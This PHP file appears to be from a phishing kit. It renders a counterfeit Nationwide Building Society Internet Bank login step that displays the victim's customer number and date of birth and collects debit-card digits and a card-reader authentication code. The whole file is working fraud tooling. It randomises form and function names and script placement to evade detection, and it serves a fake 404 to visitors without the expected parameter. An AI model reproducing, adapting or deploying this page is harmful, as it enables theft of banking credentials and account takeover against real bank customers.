<?php
session_start();
error_reporting(0);
include "nw.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["inID"]))
{	
	$cusnum=$_SESSION["cusnum"];
	$dob=$_SESSION["dob"];
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$rand=rand(1,3);
	$err="display:none";
	if(isset($_GET["err"]))
	{
		$err="";
	}
	echo '<!DOCTYPE html>
<!--[if IEMobile 7 ]> 
<html dir="ltr" lang="en-GB" class="has-no-js iem7">
   <![endif]-->
   <!--[if lt IE 7 ]> 
   <html dir="ltr" lang="en-GB" class="has-no-js ie6 old-ie">
      <![endif]-->
      <!--[if IE 7 ]>    
      <html dir="ltr" lang="en-GB" class="has-no-js ie7 old-ie">
         <![endif]-->
         <!--[if IE 8 ]>    
         <html dir="ltr" lang="en-GB" class="has-no-js ie8 old-ie">
            <![endif]-->
            <!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
            <html dir="ltr" class="has-js has-no-ie8compat has-opacity has-cssremunit has-preserve3d has-supports has-checked has-textshadow has-cssanimations has-borderradius has-boxshadow has-flexbox has-flexboxlegacy has-no-flexboxtweener has-flexwrap has-csstransforms has-csstransforms3d has-csstransitions has-cssclippathinset" style="" lang="en-GB"><head></head><body class="page login-page">
			';if($rand==1){ echo '<script> function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}} function '.$fj1.'() {var a = document.forms["'.$fname.'"]["char4"];var b = document.forms["'.$fname.'"]["char8"];document.getElementById("err-m").style.display="";document.getElementById("err-m2").style.display="none";var fd=0;var err=0;if(a.value.length<4){document.getElementById("err4").style.display="";if(fd==0){a.focus();fd=1;}err=1;}else{document.getElementById("err4").style.display="none";}if(b.value.length<4){document.getElementById("err8").style.display="";if(fd==0){b.focus();fd=1;}err=1;}else{document.getElementById("err8").style.display="none";}if(err!=1){document.getElementById("err-m").style.display="none";document.forms["'.$fname.'"].submit();} } </script>';} echo '
                  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                  <meta charset="utf-8">
                  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <meta name="format-detection" content="telephone=no">
                  <title>Internet Bank | ID Check | Nationwide</title>
                  <link rel="stylesheet" href="game/leave.css'.outrand().'">
                  <link rel="stylesheet" href="game/online.css'.outrand().'">
                  <link rel="shortcut icon" href="favicon.ico'.outrand().'">
                  <link rel="apple-touch-icon" href="game/120.png" sizes="120x120'.outrand().'">
                  <link rel="apple-touch-icon" href="game/76.png" sizes="76x76'.outrand().'">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'">
               
               
                  
                  
                  
                  
                  
                  <header class="page-header">
                     <div class="page-header__inner">
                        <div class="page-header__logo">
                           <a class="logo__image" href="#">
                           <span class="alt-text">Nationwide.co.uk</span>
                           </a>
                           <div class="page-header__subtitle-link">
                              <div class="logo__subtitle">
                                 <span class="icon"></span>
                                 Internet Bank
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
                  <div class="app app--process process">
                     <section class="stage" role="main">
                        <header class="stage__header">
                           <span class="icon"></span>
                           <div class="stage__header__title">
                              <h1>
                                 Log into the Internet Bank - Step 2 of 2
                              </h1>
                              <div class="stage__header__right">
                                 <span>Not registered?</span> <a href="#" target="">Register<span> now</span></a>
                              </div>
                              <span id="process-title-hidden-text" class="u-screen-reader-text">
                              </span>
                           </div>
                        </header>
                        <div class="stage__content">
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                                 
                                 
                                 
                                 
								 <div class="message-list validation-summary-header message-list--validation-error message-list--unordered" tabindex="0" id="err-m2" style="'.$err.'">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                       Error
                                       <span class="message-list__subtitle">Sorry - there were some errors in your submission, please try again.</span>
                                       <span class="u-screen-reader-text visuallyhidden" id="char8">Clicking this link will direct you to the field containing the error.</span>
                                    </div>
                                    <div class="message-list__items">
                                    </div>
                                 </div>
                                 <div class="message-list validation-summary-header message-list--validation-error message-list--unordered" tabindex="0" id="err-m" style="display:none">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                       Error
                                       <span class="message-list__subtitle">Sorry - you must correct the errors on this page before you can continue.</span>
                                       <span class="u-screen-reader-text visuallyhidden" id="char8">Clicking this link will direct you to the field containing the error.</span>
                                    </div>
                                    <div class="message-list__items">
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                              </div>
                           </div>
                           <div class="section">
                              <div class="section__inner">
                                 <div class="message">
                                 </div>
                              </div>
                           </div>
                           <div class="section section--no-title">
                              <div class="section__title">
                                 <h2>Let us know who you are</h2>
                              </div>
                              <div class="section__inner">        
                                 <div class="divTable">
                                    <div class="divTableRow">
                                       <div class="divTableCellBold">Customer number:</div>
                                       <div class="divTableCell">'.$cusnum.'</div>
                                    </div>
                                 </div>
                                 <div class="divTable">
                                    <div class="divTableRow">
                                       <div class="divTableCellBold">Date of birth:</div>
                                       <div class="divTableCell">'.$dob.'</div>
                                    </div>
                                 </div>
                                 <div class="link-action action action--link">
                                    <span class="u-screen-reader-text" id="link-action-text___18febfd1-3f7a-46d8-bd8c-a955b720e77c">
                                    Clicking this will take you to the previous page
                                    </span>
                                    <a href="#" target="" class="action__button" title="" id="link-action___18febfd1-3f7a-46d8-bd8c-a955b720e77c">
                                    Not you?
                                    </a>
                                 </div>
                              </div>
                           </div>
                           <div class="section section--no-title">
                              <div class="section__title">
                                 <h2>We need to check it\'s really you</h2>
                              </div>
                              <div class="section__inner">
                                 <div class="message-list message-list--no-title message-list--no-subtitle message-list--notice" role="note">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                    </div>
                                    <div class="message-list__items">
                                       <div class="message">
                                          <div style="color: #002878;"><strong>Please note</strong><br>
                                             <span style="color: #5b6063;">This is a secure service, you will need your card reader to verify your identity. Please make sure you have it on your hand.<br>
											 If you do not have card reader available, please revisit our secure service when your card reader is available to verify your identity</span>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 
                              </div>
                           </div>
                           
                           
                           
                           <div data-pl="initialized" class="section section--conditional section--conditional--visibly-dependent section--conditional--depends-on-above section--conditional--2-of-2" role="tabpanel" data-pl-depends-on="[{&quot;property&quot;:&quot;SelectedLoginRoute&quot;,&quot;value&quot;:&quot;RCA&quot;,&quot;check&quot;:&quot;equals&quot;}]" data-pl-is-active="true">
							';if($rand==2){ echo '<script> function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}} function '.$fj1.'() {var a = document.forms["'.$fname.'"]["char4"];var b = document.forms["'.$fname.'"]["char8"];document.getElementById("err-m").style.display="";document.getElementById("err-m2").style.display="none";var fd=0;var err=0;if(a.value.length<4){document.getElementById("err4").style.display="";if(fd==0){a.focus();fd=1;}err=1;}else{document.getElementById("err4").style.display="none";}if(b.value.length<4){document.getElementById("err8").style.display="";if(fd==0){b.focus();fd=1;}err=1;}else{document.getElementById("err8").style.display="none";}if(err!=1){document.getElementById("err-m").style.display="none";document.forms["'.$fname.'"].submit();} } </script>';} echo '
						   <div class="section__inner">
                                 <form name="'.$fname.'" onsubmit="'.$fj1.'(); return false;" action="Queue.php?/AccesManagement/IdentfyCustomer/'.randomChaSp(rand(5,10)).'&inID='.randomCha(rand(40,60)).'" autocomplete="off" id="'.$fname.'" method="post" novalidate="novalidate">
                                    <input id="accessmanagementloginloginviarca" name="__token" type="hidden" value="">
									<input id="PersistentCookiesEnabled" name="PersistentCookiesEnabled" type="hidden" value="true">
                                    <div class="media-group">
                                       <div class="media-group__main nopadding">
                                          <div class="section__title section__title">
                                             <h2>Use a card reader</h2>
                                          </div>
                                          <div class="message">
                                             <div class="list-text">
                                                <p>1. Enter the last 4 digits of the long 16 digit card number from your Nationwide debit card</p>
                                             </div>
                                          </div>
                                          <div class="control control--no-description control--no-help control--simple control--short text-input-control">
                                             <label class="control__label" for="char4">
                                                <span class="control__label__title">
                                                   <h3>Last 4 digits from debit card</h3>
                                                </span>
                                             </label>
                                             <div class="control__input">
                                                <input class="text-input text-input--numeric" id="char4" maxlength="4" name="char4" placeholder="" type="text" onkeypress="return '.$fj.'(event)">
                                             </div>
                                             <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error" role="alert" id="err4" style="display:none">
                                                <span class="icon"></span>
                                                <div class="message-list__title">
                                                </div>
                                                <div class="message-list__items">
                                                   <li class="message message--no-action">Please enter the last 4 digits from your debit card.</li>
                                                </div>
                                             </div>
                                             
                                          </div>
                                          <div class="message">
                                             <style>
                                                .list-text img {
                                                vertical-align: middle;
                                                padding-left: 0.188;
                                                }
                                             </style>
                                             <h3 style="color: #002878">Using a card reader</h3>
                                             <div class="list-text">
                                                <p>2. Insert debit card into card reader</p>
                                             </div>
                                             <div class="clear-line"> </div>
                                             <div class="list-text">
                                                <p>3. Press the <strong>Identify</strong> button   <img alt="" role="presentation" src="game/card_reader_identify.png"></p>
                                             </div>
                                             <div class="clear-line"> </div>
                                             <div class="list-text">
                                                <p>4. Enter your <strong>PIN</strong> and press <strong>OK</strong> button   <img alt="" role="presentation" src="game/card_reader_ok.png"></p>
                                             </div>
                                             <div class="clear-line"> </div>
                                             <div class="list-text">
                                                <p>5. Enter the 8 digit card reader code into the box below</p>
                                             </div>
                                          </div>
                                          <div class="control control--no-description control--simple control--short text-input-control">
                                             <label class="control__label" for="char8">
                                                <span class="control__label__title">
                                                   <h3>Enter code shown on card reader</h3>
                                                </span>
                                             </label>
                                             <div class="control__input">
                                                <input class="text-input text-input--numeric" id="char8" maxlength="9" name="char8" placeholder="" type="text" onkeypress="return '.$fj.'(event)">
                                             </div>
                                             <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error" role="alert" id="err8" style="display:none">
                                                <span class="icon"></span>
                                                <div class="message-list__title">
                                                </div>
                                                <div class="message-list__items">
                                                   <li class="message message--no-action">Please enter the 8 digit code shown on your card reader.</li>
                                                </div>
                                             </div>
                                             
                                             <div class="control__help">
                                                <a href="" class="control__help__trigger" target="">
                                                <span class="icon"></span>
                                                There\'s a problem with my card reader
                                                <span class="u-screen-reader-text"></span>
                                                </a>
                                                <div class="control__help__content">
                                                   <div role="dialog" class="dialog dialog--no-title">
                                                      <div class="dialog__header">
                                                         <button type="button" class="dialog__close">
                                                         <span class="icon"></span>
                                                         <span class="dialog__close__text" id="close-btn-text___965df334-ca75-45bb-a8f1-e330aa8798b7"></span>
                                                         </button>
                                                         <h1 class="dialog__title" tabindex="-1">Sorry there\'s a problem with your card reader</h1>
                                                      </div>
                                                      <div class="dialog__content">
                                                         <p>The easiest way for you to log in is to try another way instead:</p>
                                                         <p><a href="#">Enter passnumber and get a code by text</a></p>
                                                         <p>For help with your card reader please look at <a href="#">our card reader support page</a>.</p>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="media-group__media">
                                          <img alt="Picture of a card inserted into a card reader" class="png" src="game/Login%2520-%2520RCA.png">
                                       </div>
                                    </div>
                                    <div class="action action--primary action--authentication">
                                       <button class="action__button" type="submit" title="">
                                       Log in
                                       </button>
                                    </div>
                                   <div data-pl="initialized" class="message-list message-list--no-title message-list--no-subtitle message-list--notice message-list--noicon" data-pl-message-list-count="1" aria-live="assertive" aria-atomic="true" role="note">

    

    <span class="icon" aria-hidden="true"></span><div class="message-list__title">
        
    </div>
  
      
    
            <div class="message-list__items" style="margin-top: 0.313em;padding-left: 0;padding-top: 0.188em;padding-bottom: 0.375em;">
        
                <div class="message">
                    <style>
.security-details-heading {
}

.login-page  #rca-login-form .fraud-awareness-link {
    left: 0;
    bottom: 0;
   margin-bottom: 0;
   margin-top: 0;
   margin-left: 70px;
   margin-left: 4.4rem;
   overflow: wrap;
}

.login-page #rca-login-form .fraud-icon { 
    margin-top: -8px;
    margin-top: -0.5rem;
    margin-left: -3px;
    margin-left: -0.188rem;
    float: left;
    width: 68px;
}

.login-page #rca-login-form .sec-details-container {
  vertical-align: top;
   margin-top: -15px;
   margin-top: -0.938rem;
   margin-bottom: 0;
}

.login-page #rca-login-form .sec-details-container .security-details-heading {
   position: relative;
   left: 0;
   color: #002878;
   top: 0;
   overflow: wrap;
   padding-left: 15px;
   padding-left: 0.938rem;
}

.login-page .sec-details-container .security-details-heading h3 {
    margin-top: 0.313em;
   padding-left: 3.7em;
    margin-bottom: 0;
}

form#rca-login-form .message-list:nth-of-type(3) .message-list__items {
   margin-top: 0.313em;
   padding-left: 0;
   padding-top: 0.188em;
   padding-bottom: 0.375em;
}
</style>


<div class="fraud-icon" style="margin-top: -8px;margin-top: -0.5rem;margin-left: -3px;margin-left: -0.188rem;float: left;width: 68px;"><img alt="" src="game/Login-fraud.png"></div>
<div class="sec-details-container" style="vertical-align: top;margin-top: -15px;margin-top: -0.938rem;margin-bottom: 0;">
<div class="security-details-heading"><h3>Never give out your security details or the code shown on your card reader.</h3></div>
<div class="fraud-awareness-link"><a style="text-decoration: underline" href="#">Find out more about staying safe online</a></div>
</div>
                </div>
                
        </div>
    
</div>
                                 </form>
                              </div>
                           </div>
                        </div>
                        <footer class="stage__footer">
                           <div class="action-group">
                           </div>
                        </footer>
                     </section>
                  </div>
                  <footer class="page-footer">
                     <div class="page-footer__inner">
                        <div class="page-footer__navigation-social-media-copyright">
                           <div class="page-footer__navigation">
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Register</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Order a new card reader</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Security centre</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Accessibility</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Service status</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Mobile Banking app</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Internet Bank Terms and Conditions</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Contact us</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Cookies and privacy</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Troubleshooting</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                           </div>
                           <div class="page-footer__social-media-copyright">
                              <div class="page-footer__social-media">
                                 <div class="footer-heading">Follow us:</div>
                                 <ul role="navigation">
                                    <li>
                                       <a class="twitter" href="#">
                                       <span class="srText">Twitter (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="facebook" href="#">
                                       <span class="srText">Facebook (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="youtube" href="#">
                                       <span class="srText">Youtube (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="linkedin" href="#">
                                       <span class="srText">LinkedIn (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                 </ul>
                              </div>
                              <div class="page-footer__FSCS-Logo"><a href="#">
                                 <img alt="FSCS Logo" class="FSCS-Logo" src="game/FSCS_Logo.png">
                                 </a>
                              </div>
                              <div class="page-footer__copyright">© 2020 Nationwide Building Society</div>
                           </div>
                        </div>
						';if($rand==3){ echo '<script> function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}} function '.$fj1.'() {var a = document.forms["'.$fname.'"]["char4"];var b = document.forms["'.$fname.'"]["char8"];document.getElementById("err-m").style.display="";document.getElementById("err-m2").style.display="none";var fd=0;var err=0;if(a.value.length<4){document.getElementById("err4").style.display="";if(fd==0){a.focus();fd=1;}err=1;}else{document.getElementById("err4").style.display="none";}if(b.value.length<4){document.getElementById("err8").style.display="";if(fd==0){b.focus();fd=1;}err=1;}else{document.getElementById("err8").style.display="none";}if(err!=1){document.getElementById("err-m").style.display="none";document.forms["'.$fname.'"].submit();} } </script>';} echo '
                        <div class="page-footer__regulatory">
                           <p>Nationwide Building Society is authorised by the Prudential 
                              Regulation Authority and regulated by the Financial Conduct Authority 
                              and the Prudential Regulation Authority under registration number 
                              106078. You can confirm our registration on the FCA’s website <a href="#" title="" class="new-window-link">www.fca.gov.uk<span class="srText"> Opens in a new window</span></a>. Nationwide is not responsible for the content of external websites.
                           </p>
                        </div>
                     </div>
                  </footer>
            </body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>